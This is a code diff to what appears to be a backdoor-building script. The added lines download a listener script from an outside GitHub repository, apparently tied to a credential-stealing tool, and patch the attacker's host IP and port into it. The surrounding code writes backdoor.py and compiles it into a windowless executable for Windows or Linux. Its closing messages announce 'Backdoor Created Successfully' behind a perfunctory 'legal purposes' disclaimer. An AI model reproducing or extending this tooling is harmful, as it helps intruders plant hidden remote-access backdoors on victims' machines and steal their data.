@@ -43,6 +43,27 @@ with open('backdoor.py', "w") as f:
     f.write(newText)
 
 
+try:
+	os.remove('listener.py')
+except Exception:
+	pass;
+
+def download_file(link):
+    get_response = requests.get(link)
+    file_name = link.split("/")[-1]
+    with open(file_name, "wb") as out_file:
+	    out_file.write(get_response.content)
+
+download_file("https://raw.githubusercontent.com/Hokagenaruto123456/Lazagne123456/master/listener.py")
+
+
+with open('listener.py') as f:
+    newText2 = f.read().replace('unique', 'my_listener = Listener("' + arguments.host_ip + '",' + arguments.host_port + ') \n')
+
+with open('listener.py', "w") as f:
+    f.write(newText2)
+
+
 def compile_for_windows():
     subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", " backdoor.py"])
 
@@ -55,7 +76,6 @@ if arguments.windows:
 if arguments.linux:
 	compile_for_linux()
 
-print("Backdoor Created Successfully")
-
-print("\n\n[***] Please use this tool for Legal and Valid Purposes\n")
+print("\n\n\t\t [+++] Backdoor Created Successfully\n")
+print("\t[***] Please use this tool for Legal and Valid Purposes\n")
 print("\t\t [***] Adios Muchachos!!!")
